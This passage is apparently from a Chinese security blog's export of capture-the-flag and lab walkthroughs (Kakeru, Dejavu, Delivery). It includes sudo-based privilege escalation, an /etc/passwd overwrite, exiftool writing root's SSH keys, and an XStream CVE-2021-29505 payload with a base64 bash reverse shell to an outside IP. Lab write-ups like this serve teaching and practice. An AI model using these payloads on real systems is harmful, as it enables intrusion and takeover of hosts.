Connections will only be possible from clients running on this machine.1746003305: Create a configuration file which defines a listener to allow remote access.1746003305: For more details see https://mosquitto.org/documentation/authentication-methods/1746003305: Opening ipv4 listen socket on port 1883.1746003305: Opening ipv6 listen socket on port 1883.1746003305: mosquitto version 2.0.21 running 如果端口没有监听0.0.0.0的话可以用socat将1883转发出来 然后再welcome的家目录创建一个软连接，指向/etc/passwd 1welcome@Bamuwe:~$ ln -sf /etc/passwd sub.log 将靶机里的/etc/passwd文件复制一份，添加一条用户信息 1ll:$1$Zg12rJZk$P7IV1RqAT005RKjprDSo41:0:0:root:/root:/bin/bash 1234┌──(root㉿kali)-[~/Desktop/tmp]└─# mosquitto_pub -t test -f passwdwelcome@Bamuwe:~$ sudo /opt/sub.sh -h 192.168.31.129 -p 1884 -t test 然后/etc/passwd就被覆盖了 1welcome@Bamuwe:~$ su - ll 密码是123123 提权成功","categories":[{"name":"660930334","slug":"660930334","permalink":"https://lvzhouhang.xyz/categories/660930334/"}],"tags":[{"name":"靶机","slug":"靶机","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"群友机-Kakeru","slug":"群友靶机-Kakeru","date":"2025-04-29T06:00:01.000Z","updated":"2025-04-30T09:48:07.115Z","comments":true,"path":"2025/04/29/群友靶机-Kakeru/","permalink":"https://lvzhouhang.xyz/2025/04/29/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA-Kakeru/","excerpt":"","text":"信息搜集1234567┌──(root㉿kali)-[~/Desktop/tmp]└─# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1 0a:00:27:00:00:11 (Unknown: locally administered)192.168.31.2 08:00:27:8f:69:69 PCS Systemtechnik GmbH192.168.31.170 08:00:27:bf:56:1c PCS Systemtechnik GmbH 192.168.31.170就是靶机ip地址 123456789101112┌──(root㉿kali)-[~/Desktop/tmp]└─# nmap 192.168.31.170 -p-Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-29 02:02 EDTNmap scan report for 192.168.31.170Host is up (0.0026s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open httpMAC Address: 08:00:27:BF:56:1C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 13.22 seconds 80端口123456789101112131415161718192021 &lt;title&gt;User welcome&#x27;s password is here.&lt;/title&gt; POST /login HTTP/1.1Host: 192.168.3.132User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflate, brContent-Type: application/x-www-form-urlencodedContent-Length: 31Origin: http://192.168.3.132Connection: keep-aliveReferer: http://192.168.3.132/Cookie: PHPSESSID=eiag23f4enj5tfcpl7t1qhhk2tUpgrade-Insecure-Requests: 1Priority: u=0, iusername=admin&amp;amp;password=admin(&lt;=x-).+(?=en) 有用的信息就是这些，从这可以得知存在welcome用户，然后告诉我们密码就在这里，还有一个正则表达式，可以联想到，密码应该就是用正则去匹配上面的数据包 1234┌──(root㉿kali)-[~/Desktop/tmp]└─# http http://192.168.31.170|grep -P &#x27;(?&lt;=x-).+(?=en)&#x27; -owww-form-urlhighlight&quot;&gt;(?&amp;lt;=x-).+(?= 密码就是www-form-url ssh登录 提权12345678910111213141516171819202122232425262728293031welcome@Kakeru:~$ lssudoers.bak user.txtwelcome@Kakeru:~$ cat sudoers.bak## This file MUST be edited with the &#x27;visudo&#x27; command as root.## Please consider adding local content in /etc/sudoers.d/ instead of# directly modifying this file.## See the man page for details on how to write a sudoers file.#Defaults env_resetDefaults mail_badpassDefaults secure_path=&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;# Host alias specification# User alias specification# Cmnd alias specification# User privilege specificationroot ALL=(ALL:ALL) ALL# Allow members of group sudo to execute any command%sudo ALL=(ALL:ALL) ALLwelcome Dashazi=(kakeru) NOPASSWD: /usr/bin/lesskakeru ALL=(ALL:ALL) NOPASSWD: /opt/test.sh# See sudoers(5) for more information on &quot;@include&quot; directives:@includedir /etc/sudoers.d welcome可以在Dashazi上以kakeru用户执行/usr/bin/less 12welcome@Kakeru:~$ sudo -u kakeru -h Dashazi /usr/bin/less --help!sh 123456kakeru@Kakeru:/opt$ sudo -lMatching Defaults entries for kakeru on Kakeru: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser kakeru may run the following commands on Kakeru: (ALL : ALL) NOPASSWD: /opt/test.sh 可以看到可以执行/opt/test.sh，但是内容没办法看，同时家目录也有一个test.sh,这两个文件可能存在关系 123kakeru@Kakeru:/opt$ sudo /opt/test.shPlease Input: a/opt/test.sh: line 5: a: command not found 运行发现只能输入一个字符，输入空格可以发现 123kakeru@Kakeru:/opt$ sudo /opt/test.shPlease Input:/opt/test.sh: line 5: /home/kakeru/test.sh: Permission denied 哎！报错了，指向家目录的test.sh，而家目录的test.sh是没有可执行权限的，所以就能知道程序以你输入的那个字符来运行/home/kakeru/test.sh，输入一个. 123kakeru@Kakeru:~$ sudo /opt/test.shPlease Input: .test 会发现/home/kakeru/test.sh被执行了，将家目录的test.sh文件改个名再重新写一个test.sh 123456kakeru@Kakeru:~$ mv test.sh 1kakeru@Kakeru:~$ echo &#x27;bash -p&#x27;&gt;test.shkakeru@Kakeru:~$ chmod +x ./test.shkakeru@Kakeru:~$ sudo /opt/test.shPlease Input:root@Kakeru:/home/kakeru# 提权成功","categories":[{"name":"660930334","slug":"660930334","permalink":"https://lvzhouhang.xyz/categories/660930334/"}],"tags":[{"name":"靶机","slug":"靶机","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"HackmyVM-Dejavu","slug":"HackmyVM-Dejavu","date":"2025-04-29T02:45:14.000Z","updated":"2025-04-29T03:22:53.168Z","comments":true,"path":"2025/04/29/HackmyVM-Dejavu/","permalink":"https://lvzhouhang.xyz/2025/04/29/HackmyVM-Dejavu/","excerpt":"","text":"信息搜集1234567┌──(root㉿kali)-[~/Desktop/tmp]└─# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1 0a:00:27:00:00:11 (Unknown: locally administered)192.168.31.2 08:00:27:8f:69:69 PCS Systemtechnik GmbH192.168.31.169 08:00:27:b7:b2:91 PCS Systemtechnik GmbH 192.168.31.169就是靶机地址 123456789101112┌──(root㉿kali)-[~/Desktop/tmp]└─# nmap 192.168.31.169Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-28 22:42 EDTNmap scan report for 192.168.31.169Host is up (0.00087s latency).Not shown: 998 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open httpMAC Address: 08:00:27:B7:B2:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 6.88 seconds 80端口123456789101112131415161718┌──(root㉿kali)-[~/Desktop/tmp]└─# gobuster dir -u &quot;http://192.168.31.169/&quot; -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .txt,.php===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://192.168.31.169/[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.6[+] Extensions: php,txt[+] Timeout: 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/info.php (Status: 200) [Size: 69969] 只能扫到一个info.php，是一个phpinfo页面，前端注释里有一个 1&lt;!-- /S3cR3t --&gt; 访问/S3cR3t有一个upload.php,php后缀禁止上传，改后缀为phtml,有disable_function，可以用蚁剑的插件绕过disable_functions绕过 反弹一个shell出来 提权1234567www-data@dejavu:/opt$ sudo -lMatching Defaults entries for www-data on dejavu: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser www-data may run the following commands on dejavu: (robert) NOPASSWD: /usr/sbin/tcpdump 可以无密码以robert执行tcpdump 12345COMMAND=&#x27;id&#x27;TF=$(mktemp)echo &quot;$COMMAND&quot; &gt; $TFchmod +x $TFsudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root 但是提权的时候提示权限不够，只能另寻他路 上传一个pspy64，监控进程 1234562025/04/29 03:05:01 CMD: UID=1000 PID=1715 | /usr/sbin/CRON -f2025/04/29 03:05:01 CMD: UID=1000 PID=1716 | /bin/sh -c /home/robert/auth.sh2025/04/29 03:05:01 CMD: UID=1000 PID=1717 | /bin/sh /home/robert/auth.sh2025/04/29 03:05:01 CMD: UID=65534 PID=1719 | /usr/sbin/vsftpd /etc/vsftpd.conf2025/04/29 03:05:01 CMD: UID=0 PID=1718 | /usr/sbin/vsftpd /etc/vsftpd.conf2025/04/29 03:05:01 CMD: UID=1000 PID=1720 | /usr/sbin/vsftpd /etc/vsftpd.conf 发现robert会运行auth.sh，还和ftp有关系，用tcpdump抓一下包看看 123456789101112131415www-data@dejavu:/tmp$ sudo -u robert /usr/sbin/tcpdump tcp port 21 -i lotcpdump: verbose output suppressed, use -v or -vv for full protocol decodelistening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes03:09:01.651819 IP localhost.51594 &gt; localhost.ftp: Flags [S], seq 1560518222, win 65495, options [mss 65495,sackOK,TS val 2363185351 ecr 0,nop,wscale 7], length 003:09:01.651828 IP localhost.ftp &gt; localhost.51594: Flags [S.], seq 206236889, ack 1560518223, win 65483, options [mss 65495,sackOK,TS val 2363185351 ecr 2363185351,nop,wscale 7], length 003:09:01.651835 IP localhost.51594 &gt; localhost.ftp: Flags [.], ack 1, win 512, options [nop,nop,TS val 2363185351 ecr 2363185351], length 003:09:01.652915 IP localhost.ftp &gt; localhost.51594: Flags [P.], seq 1:21, ack 1, win 512, options [nop,nop,TS val 2363185352 ecr 2363185351], length 20: FTP: 220 (vsFTPd 3.0.3)03:09:01.653039 IP localhost.51594 &gt; localhost.ftp: Flags [.], ack 21, win 512, options [nop,nop,TS val 2363185352 ecr 2363185352], length 003:09:01.653087 IP localhost.51594 &gt; localhost.ftp: Flags [P.], seq 1:14, ack 21, win 512, options [nop,nop,TS val 2363185352 ecr 2363185352], length 13: FTP: USER robert03:09:01.653089 IP localhost.ftp &gt; localhost.51594: Flags [.], ack 14, win 512, options [nop,nop,TS val 2363185353 ecr 2363185352], length 003:09:01.653260 IP localhost.ftp &gt; localhost.51594: Flags [P.], seq 21:55, ack 14, win 512, options [nop,nop,TS val 2363185353 ecr 2363185352], length 34: FTP: 331 Please specify the password.03:09:01.653312 IP localhost.51594 &gt; localhost.ftp: Flags [.], ack 55, win 512, options [nop,nop,TS val 2363185353 ecr 2363185353], length 003:09:01.653355 IP localhost.51594 &gt; localhost.ftp: Flags [P.], seq 14:32, ack 55, win 512, options [nop,nop,TS val 2363185353 ecr 2363185353], length 18: FTP: PASS 9737bo0hFx403:09:01.653357 IP localhost.ftp &gt; localhost.51594: Flags [.], ack 32, win 512, options [nop,nop,TS val 2363185353 ecr 2363185353], length 003:09:01.664382 IP localhost.ftp &gt; localhost.51594: Flags [P.], seq 55:78, ack 32, win 512, options [nop,nop,TS val 2363185364 ecr 2363185353], length 23: FTP: 230 Login successful. 可以发现robert的密码是9737bo0hFx4,su切换用户 1234567robert@dejavu:/tmp$ sudo -lMatching Defaults entries for robert on dejavu: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser robert may run the following commands on dejavu: (root) NOPASSWD: /usr/local/bin/exiftool exiftool可以写入任意文件，写个公钥即可 123LFILE=file_to_writeINPUT=input_filesudo exiftool -filename=$LFILE $INPUT 12robert@dejavu:/tmp$ sudo exiftool -filename=$LFILE $INPUTError: &#x27;/root/.ssh/authorized_keys&#x27; already exists - ./authorized_keys 已经存在了，那就把这个公钥移动过来，在写公钥进去 12robert@dejavu:/tmp$ sudo exiftool -filename=./1 /root/.ssh/authorized_keysrobert@dejavu:/tmp$ sudo exiftool -filename=/root/.ssh/authorized_keys ./authorized_keys 然后ssh登录即可","categories":[{"name":"HackMyVM","slug":"HackMyVM","permalink":"https://lvzhouhang.xyz/categories/HackMyVM/"}],"tags":[{"name":"靶机","slug":"靶机","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"春秋云镜-Delivery","slug":"春秋云镜-Delivery","date":"2025-04-27T07:42:03.000Z","updated":"2025-04-29T03:23:01.542Z","comments":true,"path":"2025/04/27/春秋云镜-Delivery/","permalink":"https://lvzhouhang.xyz/2025/04/27/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delivery/","excerpt":"","text":"FLAG01先用 fscan 进行一波信息搜集 12345678910111213141516171819202122232425262728293031┌──(root㉿kali)-[~/Desktop/tmp]└─# ../pentest/fscan/fscan2 -h 39.99.157.149┌──────────────────────────────────────────────┐│ ___ _ ││ / _ \\ _ __ __ _ _ __ __ _ _ __| | __ ││ / /_\\/____/ _ _|/ _ _| &#x27;_ _/ _` |/ __| |/ / ││ / /_\\\\_ ____\\__ \\ (__| | | (_| | (__| &lt; ││ \\____/ |___/\\___|_| \\_ _,_|\\___|_|\\_\\ │└──────────────────────────────────────────────┘ Fscan Version: 2.0.0[2025-04-27 03:44:50] [INFO] 暴力破解线程数: 1[2025-04-27 03:44:50] [INFO] 开始信息扫描[2025-04-27 03:44:50] [INFO] 最终有效主机数量: 1[2025-04-27 03:44:51] [INFO] 开始主机扫描[2025-04-27 03:44:51] [INFO] 有效端口数量: 233[2025-04-27 03:44:51] [SUCCESS] 端口开放 39.99.157.149:22[2025-04-27 03:44:51] [SUCCESS] 端口开放 39.99.157.149:80[2025-04-27 03:44:51] [SUCCESS] 端口开放 39.99.157.149:21[2025-04-27 03:44:51] [SUCCESS] 服务识别 39.99.157.149:22 =&gt; [ssh] 版本: 8.2p1 Ubuntu 4ubuntu0.5 产品: OpenSSH 系统: Linux 信息: Ubuntu Linux; protocol 2.0 Banner: [SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.][2025-04-27 03:44:51] [SUCCESS] 服务识别 39.99.157.149:21 =&gt; [ftp] 版本: 3.0.3 产品: vsftpd 系统: Unix Banner: [220 (vsFTPd 3.0.3).][2025-04-27 03:44:53] [SUCCESS] 端口开放 39.99.157.149:8080[2025-04-27 03:44:56] [SUCCESS] 服务识别 39.99.157.149:80 =&gt; [http][2025-04-27 03:44:59] [SUCCESS] 服务识别 39.99.157.149:8080 =&gt; [http][2025-04-27 03:45:00] [INFO] 存活端口数量: 4[2025-04-27 03:45:00] [INFO] 开始漏洞扫描[2025-04-27 03:45:00] [INFO] 加载的插件: ftp, ssh, webpoc, webtitle[2025-04-27 03:45:01] [SUCCESS] 网站标题 http://39.99.157.149 状态码: 200 长度: 10918 标题: Apache2 Ubuntu Default Page: It works[2025-04-27 03:45:02] [SUCCESS] 匿名登录成功![2025-04-27 03:45:02] [SUCCESS] 网站标题 http://39.99.157.149:8080 状态码: 200 长度: 3655 标题: 公司发货单[2025-04-27 03:45:08] [SUCCESS] 扫描已完成: 6/6 ftp 可以匿名登陆，登录之后可以下载一个 pom.xml 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt; project xmlns = &quot;http://maven.apache.org/POM/4.0.0&quot; xmlns: xsi = &quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi: schemaLocation = &quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot; &gt; &lt;modelVersion&gt; 4.0.0 &lt;/modelVersion&gt; &lt;parent&gt; &lt;groupId&gt; org.springframework.boot &lt;/groupId&gt; &lt;artifactId&gt; spring-boot-starter-parent &lt;/artifactId&gt; &lt;version&gt; 2.7.2 &lt;/version&gt; &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt; &lt;/parent&gt; &lt;groupId&gt; com.example &lt;/groupId&gt; &lt;artifactId&gt; ezjava &lt;/artifactId&gt; &lt;version&gt; 0.0.1-SNAPSHOT &lt;/version&gt; &lt;name&gt; ezjava &lt;/name&gt; &lt;description&gt; ezjava &lt;/description&gt; &lt;properties&gt; &lt;java.version&gt; 1.8 &lt;/java.version&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt; org.springframework.boot &lt;/groupId&gt; &lt;artifactId&gt; spring-boot-starter-thymeleaf &lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt; org.springframework.boot &lt;/groupId&gt; &lt;artifactId&gt; spring-boot-starter-web &lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt; org.springframework.boot &lt;/groupId&gt; &lt;artifactId&gt; spring-boot-starter-test &lt;/artifactId&gt; &lt;scope&gt; test &lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt; com.thoughtworks.xstream &lt;/groupId&gt; &lt;artifactId&gt; xstream &lt;/artifactId&gt; &lt;version&gt; 1.4.16 &lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt; commons-collections &lt;/groupId&gt; &lt;artifactId&gt; commons-collections &lt;/artifactId&gt; &lt;version&gt; 3.2.1 &lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt; org.springframework.boot &lt;/groupId&gt; &lt;artifactId&gt; spring-boot-maven-plugin &lt;/artifactId&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt;&lt;/project&gt; 存在有危险的依赖 1234567891011&lt;dependency&gt; &lt;groupId&gt; com.thoughtworks.xstream &lt;/groupId&gt; &lt;artifactId&gt; xstream &lt;/artifactId&gt; &lt;version&gt; 1.4.16 &lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt; commons-collections &lt;/groupId&gt; &lt;artifactId&gt; commons-collections &lt;/artifactId&gt; &lt;version&gt; 3.2.1 &lt;/version&gt; &lt;/dependency&gt; 存在 CVE-2021-29505 用 ysoserial 进行反弹 shell 1java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 &quot; bash -c &#123;echo, YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDYuNzUuNzAuMjAyLzQ0NDQgMD4mMQ ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; 在 8080 端口抓包替换成 payload 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt; &lt;unserializable-parents/&gt; &lt;java.util.PriorityQueue&gt; &lt;default&gt; &lt;size&gt; 2 &lt;/size&gt; &lt;/default&gt; &lt;int&gt; 3 &lt;/int&gt; &lt;javax.naming.ldap.Rdn_-RdnEntry&gt; &lt;type&gt; 12345 &lt;/type&gt; &lt;value class=&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;&gt; &lt;m__obj class=&#x27;string&#x27;&gt; com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content &lt;/m__obj&gt; &lt;/value&gt; &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt; &lt;javax.naming.ldap.Rdn_-RdnEntry&gt; &lt;type&gt; 12345 &lt;/type&gt; &lt;value class=&#x27;com.sun.xml.internal.ws.api.message.Packet&#x27; serialization=&#x27;custom&#x27;&gt; &lt;message class=&#x27;com.sun.xml.internal.ws.message.saaj.SAAJMessage&#x27;&gt; &lt;parsedMessage&gt; true &lt;/parsedMessage&gt; &lt;soapVersion&gt; SOAP_11 &lt;/soapVersion&gt; &lt;bodyParts/&gt; &lt;sm class=&#x27;com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl&#x27;&gt; &lt;attachmentsInitialized&gt; false &lt;/attachmentsInitialized&gt; &lt;nullIter class=&#x27;com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator&#x27;&gt; &lt;aliases class=&#x27;com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl&#x27;&gt; &lt;candidates class=&#x27;com.sun.jndi.rmi.registry.BindingEnumeration&#x27;&gt; &lt;names&gt; &lt;string&gt; aa &lt;/string&gt; &lt;string&gt; aa &lt;/string&gt; &lt;/names&gt; &lt;ctx&gt; &lt;environment/&gt; &lt;registry class=&#x27;sun.rmi.registry.RegistryImpl_Stub&#x27; serialization=&#x27;custom&#x27;&gt; &lt;java.rmi.server.RemoteObject&gt; &lt;string&gt; UnicastRef &lt;/string&gt; &lt;string&gt; 106.75.70.202 &lt;/string&gt; &lt;int&gt; 1099 &lt;/int&gt; &lt;long&gt; 0 &lt;/long&gt; &lt;int&gt; 0 &lt;/int&gt; &lt;long&gt; 0 &lt;/long&gt; &lt;short&gt; 0 &lt;/short&gt; &lt;boolean&gt; false &lt;/boolean&gt; &lt;/java.rmi.server.RemoteObject&gt; &lt;/registry&gt; &lt;host&gt; 106.75.70.202 &lt;/host&gt; &lt;port&gt; 1099 &lt;/port&gt; &lt;/ctx&gt; &lt;/candidates&gt; &lt;/aliases&gt; &lt;/nullIter&gt; &lt;/sm&gt; &lt;/message&gt; &lt;/value&gt; &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt; &lt;/java.util.PriorityQueue&gt;&lt;/java.util.PriorityQueue&gt; 发包之后 shell 就弹出来了，然后写个公钥进去，flag1 在/root/flag 下 FLAG02上传一个 fscan 扫描内网，再搭建一个代理 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495root@ubuntu:~# ip a1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 :: 1/128 scope host valid_lft forever preferred_lft forever2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 00:16:3e: 09:09:4b brd ff: ff: ff: ff: ff: ff inet 172.22.13.14/16 brd 172.22.255.255 scope global dynamic eth0 valid_lft 315359007sec preferred_lft 315359007sec inet6 fe80:: 216:3eff: fe09:94b/64 scope link valid_lft forever preferred_lft foreverroot@ubuntu:~# ./fflag/ fscan2root@ubuntu:~# ./fscan2 -h 172.22.13.14/24┌──────────────────────────────────────────────┐│ ___ _ ││ / _ \\ _ __ __ _ _ __ __ _ _ __| | __ ││ / /_\\/____/ _ _|/ _ _| &#x27;_ _/ _` |/ __| |/ / ││ / /_\\\\_ ____\\__ \\ (__| | | (_| | (__| &lt; ││ \\____/ |___/\\___|_| \\_ _,_|\\___|_|\\_\\ │└──────────────────────────────────────────────┘ Fscan Version: 2.0.0[2025-04-27 15:59:52] [INFO] 暴力破解线程数: 1[2025-04-27 15:59:52] [INFO] 开始信息扫描[2025-04-27 15:59:52] [INFO] CIDR 范围: 172.22.13.0-172.22.13.255[2025-04-27 15:59:52] [INFO] 生成 IP 范围: 172.22.13.0.%! d(string = 172.22.13.255) - %! s(MISSING).%! d(MISSING)[2025-04-27 15:59:52] [INFO] 解析 CIDR 172.22.13.14/24 -&gt; IP 范围 172.22.13.0-172.22.13.255[2025-04-27 15:59:52] [INFO] 最终有效主机数量: 256[2025-04-27 15:59:52] [INFO] 开始主机扫描[2025-04-27 15:59:52] [SUCCESS] 目标 172.22.13.14 存活 (ICMP)[2025-04-27 15:59:52] [SUCCESS] 目标 172.22.13.6 存活 (ICMP)[2025-04-27 15:59:52] [SUCCESS] 目标 172.22.13.57 存活 (ICMP)[2025-04-27 15:59:52] [SUCCESS] 目标 172.22.13.28 存活 (ICMP)[2025-04-27 15:59:55] [INFO] 存活主机数量: 4[2025-04-27 15:59:55] [INFO] 有效端口数量: 233[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.57:22[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.14:22[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.14:21[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.28:80[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.57:80[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.28:135[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.14:80[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.6:135[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.6:445[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.6:88[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.6:389[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.28:139[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.6:139[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.28:445[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.28:3306[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.28:8000[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.14:8080[2025-04-27 15:59:55] [SUCCESS] 服务识别 172.22.13.57:22 =&gt; [ssh] 版本: 7.4 产品: OpenSSH 信息: protocol 2.0 Banner: [SSH-2.0-OpenSSH_7.4.][2025-04-27 15:59:56] [SUCCESS] 服务识别 172.22.13.14:22 =&gt; [ssh] 版本: 8.2p1 Ubuntu 4ubuntu0.5 产品: OpenSSH 系统: Linux 信息: Ubuntu Linux; protocol 2.0 Banner: [SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.][2025-04-27 15:59:56] [SUCCESS] 服务识别 172.22.13.14:21 =&gt; [ftp] 版本: 3.0.3 产品: vsftpd 系统: Unix Banner: [220 (vsFTPd 3.0.3).][2025-04-27 16:00:01] [SUCCESS] 服务识别 172.22.13.57:80 =&gt; [http] 版本: 1.20.1 产品: nginx[2025-04-27 16:00:01] [SUCCESS] 服务识别 172.22.13.6:445 =&gt;[2025-04-27 16:00:01] [SUCCESS] 服务识别 172.22.13.6:88 =&gt;[2025-04-27 16:00:01] [SUCCESS] 服务识别 172.22.13.28:80 =&gt; [http][2025-04-27 16:00:01] [SUCCESS] 服务识别 172.22.13.28:139 =&gt; Banner: [.][2025-04-27 16:00:01] [SUCCESS] 服务识别 172.22.13.6:389 =&gt;[2025-04-27 16:00:01] [SUCCESS] 服务识别 172.22.13.6:139 =&gt; Banner: [.][2025-04-27 16:00:01] [SUCCESS] 服务识别 172.22.13.28:445 =&gt;[2025-04-27 16:00:01] [SUCCESS] 服务识别 172.22.13.28:8000 =&gt;[2025-04-27 16:00:02] [SUCCESS] 服务识别 172.22.13.14:8080 =&gt; [http][2025-04-27 16:00:02] [SUCCESS] 服务识别 172.22.13.14:80 =&gt; [http][2025-04-27 16:00:09] [SUCCESS] 服务识别 172.22.13.28:3306 =&gt; Banner: [!.#08S01Got packets out of order][2025-04-27 16:01:01] [SUCCESS] 服务识别 172.22.13.28:135 =&gt;[2025-04-27 16:01:01] [SUCCESS] 服务识别 172.22.13.6:135 =&gt;[2025-04-27 16:01:01] [INFO] 存活端口数量: 17[2025-04-27 16:01:01] [INFO] 开始漏洞扫描[2025-04-27 16:01:01] [INFO] 加载的插件: findnet, ftp, ldap, ms17010, mysql, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle[2025-04-27 16:01:01] [SUCCESS] 网站标题 http://172.22.13.57 状态码: 200 长度: 4833 标题: Welcome to CentOS[2025-04-27 16:01:01] [SUCCESS] NetInfo 扫描结果目标主机: 172.22.13.6主机名: WIN-DC发现的网络接口: IPv4 地址: └─ 172.22.13.6[2025-04-27 16:01:01] [SUCCESS] 网站标题 http://172.22.13.28 状态码: 200 长度: 2525 标题: 欢迎登录 OA 办公平台[2025-04-27 16:01:01] [SUCCESS] 匿名登录成功![2025-04-27 16:01:01] [SUCCESS] NetBios 172.22.13.6 DC: XIAORANG\\WIN-DC[2025-04-27 16:01:01] [SUCCESS] 网站标题 http://172.22.13.14 状态码: 200 长度: 10918 标题: Apache2 Ubuntu Default Page: It works[2025-04-27 16:01:01] [SUCCESS] NetInfo 扫描结果目标主机: 172.22.13.28主机名: WIN-HAUWOLAO发现的网络接口: IPv4 地址: └─ 172.22.13.28[2025-04-27 16:01:01] [SUCCESS] NetBios 172.22.13.28 WIN-HAUWOLAO.xiaorang.lab Windows Server 2016 Datacenter 14393[2025-04-27 16:01:01] [SUCCESS] 网站标题 http://172.22.13.14:8080 状态码: 200 长度: 3655 标题: 公司发货单[2025-04-27 16:01:01] [SUCCESS] 网站标题 http://172.22.13.28:8000 状态码: 200 长度: 170 标题: Nothing Here. 题目提示了要打 NFS，先扫一下 2049 的端口 123456789101112131415161718192021222324root@ubuntu:~# ./fscan2 